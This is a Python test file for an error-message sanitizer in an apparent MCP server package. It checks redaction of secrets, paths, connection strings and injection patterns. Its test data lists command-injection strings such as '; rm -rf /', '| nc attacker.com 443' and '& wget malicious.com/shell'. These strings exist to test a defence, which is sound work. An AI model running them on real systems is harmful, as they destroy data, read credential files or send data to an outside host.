"""Simple tests for middleware components to improve coverage."""

from swag_mcp.middleware.error_handling import (
    SecurityErrorMiddleware,
    create_user_friendly_error,
    get_error_handling_middleware,
    get_security_error_middleware,
    sanitize_error_message,
)
from swag_mcp.services.errors import SwagServiceError


class TestErrorHandlingUtils:
    """Test error handling utility functions."""

    def test_sanitize_error_message_basic(self):
        """Test basic error message sanitization."""
        # Safe message should pass through
        safe_msg = "Invalid port number"
        result = sanitize_error_message(safe_msg)
        assert result == safe_msg

        # Empty message should get default
        result = sanitize_error_message("")
        assert result == "Invalid request parameters"

        # Whitespace message should get default
        result = sanitize_error_message("   ")
        assert result == "Invalid request parameters"

    def test_sanitize_error_message_sensitive_patterns(self):
        """Test sanitization of sensitive patterns."""
        test_cases = [
            ("Error with password=secret123", "password=secret123"),
            ("File /etc/passwd not found", "/etc/passwd"),
            ("Connection to 127.0.0.1:8080 failed", "127.0.0.1:8080"),
            ("Template {{evil}} failed", "{{evil}}"),
        ]

        for message, sensitive_part in test_cases:
            result = sanitize_error_message(message)
            # The sensitive part should be replaced with [REDACTED] or removed
            if "[REDACTED]" in result:
                assert sensitive_part not in result
            elif result == "Invalid request parameters":
                # Completely sanitized due to too much sensitive content
                assert sensitive_part not in result

    def test_sanitize_error_message_length_limit(self):
        """Test error message length limiting."""
        long_message = "A" * 600  # Longer than 500 char limit
        result = sanitize_error_message(long_message)
        assert len(result) <= 500
        if len(result) == 500:
            assert result.endswith("...")

    def test_create_user_friendly_error_validation(self):
        """Test user-friendly error creation for validation errors."""
        # Test with a ValidationError-like error
        # (the function checks for "ValidationError" in type name)
        class ValidationError(Exception):
            pass

        error = ValidationError("string_pattern_mismatch in service_name")
        result = create_user_friendly_error(error)
        assert "Invalid service name" in result

        # Test with a generic ValueError - should just sanitize the message
        error2 = ValueError("some generic error")
        result2 = create_user_friendly_error(error2)
        assert result2 == "some generic error"

    def test_create_user_friendly_error_file_errors(self):
        """Test user-friendly error creation for file errors."""
        # FileNotFoundError
        error = FileNotFoundError("test.conf not found")
        result = create_user_friendly_error(error)
        assert "not found" in result.lower()

        # PermissionError
        permission_error = PermissionError("Permission denied")
        result = create_user_friendly_error(permission_error)
        assert "access denied" in result.lower() or "permission" in result.lower()

    def test_create_user_friendly_error_timeout(self):
        """Test user-friendly error creation for timeout errors."""
        error = TimeoutError("Operation timed out after 30s")
        result = create_user_friendly_error(error)
        assert "timed out" in result.lower()

    def test_create_user_friendly_error_swag_service(self):
        """Test user-friendly error creation for SwagServiceError."""
        error = SwagServiceError("Configuration template not found")
        result = create_user_friendly_error(error)
        assert "Configuration template not found" in result

    def test_create_user_friendly_error_generic(self):
        """Test user-friendly error creation for generic errors."""
        error = ValueError("Some generic error message")
        result = create_user_friendly_error(error)
        assert isinstance(result, str)
        assert len(result) > 0

    def test_create_user_friendly_error_toolerror_inner(self):
        """ToolError with inner message should be unwrapped and mapped/sanitized."""
        from fastmcp.exceptions import ToolError
        err = ToolError("Error calling tool 'swag': ValueError: invalid domain format")
        result = create_user_friendly_error(err)
        assert isinstance(result, str)
        assert "invalid" in result.lower()
        assert "domain" in result.lower()

    def test_security_error_middleware_creation(self):
        """Test SecurityErrorMiddleware creation."""
        middleware = get_security_error_middleware()
        assert isinstance(middleware, SecurityErrorMiddleware)

    def test_error_handling_middleware_creation(self):
        """Test error handling middleware creation."""
        middleware = get_error_handling_middleware()
        assert middleware is not None

    def test_sanitize_multiple_redactions(self):
        """Test cleanup of multiple consecutive redactions."""
        message = "Error password=secret token=abc key=123 end"
        result = sanitize_error_message(message)
        # Should not have multiple consecutive [REDACTED] entries
        assert "[REDACTED] [REDACTED]" not in result

    def test_sanitize_unicode_handling(self):
        """Test handling of Unicode characters."""
        unicode_message = "Error with café and naïve characters"
        result = sanitize_error_message(unicode_message)
        assert isinstance(result, str)
        assert len(result) > 0

    def test_dangerous_pattern_detection(self):
        """Test detection and handling of dangerous patterns."""
        dangerous_patterns = [
            "eval('malicious')",
            "__import__('os')",
            "; rm -rf /",
            "$(malicious)",
        ]

        for pattern in dangerous_patterns:
            result = sanitize_error_message(f"Error: {pattern}")
            # Should either be sanitized with [REDACTED] or completely replaced
            if result != "Invalid request parameters":
                # If not completely replaced, dangerous pattern should be gone
                assert pattern not in result

    def test_network_pattern_sanitization(self):
        """Test sanitization of network-related patterns."""
        network_patterns = [
            "localhost:8080",
            "192.168.1.100:3306",
            "mysql://user:pass@host/db",
            "https://internal.service.com/api",
        ]

        for pattern in network_patterns:
            result = sanitize_error_message(f"Connection error: {pattern}")
            # Internal network details should be sanitized
            if "[REDACTED]" in result:
                assert pattern not in result

    def test_windows_path_sanitization(self):
        """Test sanitization of Windows-style paths."""
        windows_paths = [
            "C:\\Windows\\System32\\config",
            "D:\\secret\\files\\password.txt",
        ]

        for path in windows_paths:
            result = sanitize_error_message(f"File error: {path}")
            # Windows paths should be sanitized
            if "[REDACTED]" in result:
                assert path not in result

    def test_command_injection_patterns(self):
        """Test sanitization of command injection patterns."""
        injection_patterns = [
            "; cat /etc/passwd",
            "| nc attacker.com 443",
            "& wget malicious.com/shell",
            "`whoami`",
        ]

        for pattern in injection_patterns:
            result = sanitize_error_message(f"Command error: {pattern}")
            # Command injection patterns should be sanitized
            if result != "Invalid request parameters":
                assert pattern not in result

    def test_sql_connection_string_sanitization(self):
        """Test sanitization of database connection strings."""
        patterns = [
            "mysql://user:pass@host/db",
            "postgres://user:password@localhost/mydb",
            "Connection failed: mysql://admin:secret@192.168.1.100/production",
        ]

        for pattern in patterns:
            result = sanitize_error_message(f"Database error: {pattern}")
            # Connection strings should be sanitized
            assert "[REDACTED]" in result
            # Should not contain the original connection string
            assert "mysql://" not in result
            assert "postgres://" not in result

    def test_regex_pattern_safety(self):
        """Test that regex patterns don't cause ReDoS."""
        # Test with potentially problematic input
        problematic_inputs = [
            "a" * 1000,  # Very long string
            "((((((" * 100,  # Many opening parens
            "{{{{{{" * 100,  # Many template markers
        ]

        for test_input in problematic_inputs:
            result = sanitize_error_message(f"Error: {test_input}")
            assert isinstance(result, str)
